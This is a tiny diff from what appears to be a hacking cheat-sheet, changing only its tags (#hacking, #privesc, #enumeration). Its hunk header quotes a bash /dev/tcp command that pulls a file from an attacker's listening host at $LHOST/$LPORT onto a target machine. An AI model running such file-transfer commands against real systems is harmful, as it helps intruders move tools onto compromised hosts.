@@ -12,4 +12,4 @@ bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
 
 Tags:
 
-    #assorted #command #hacking #privesc #enumeration
+    #command #hacking #privesc #enumeration 
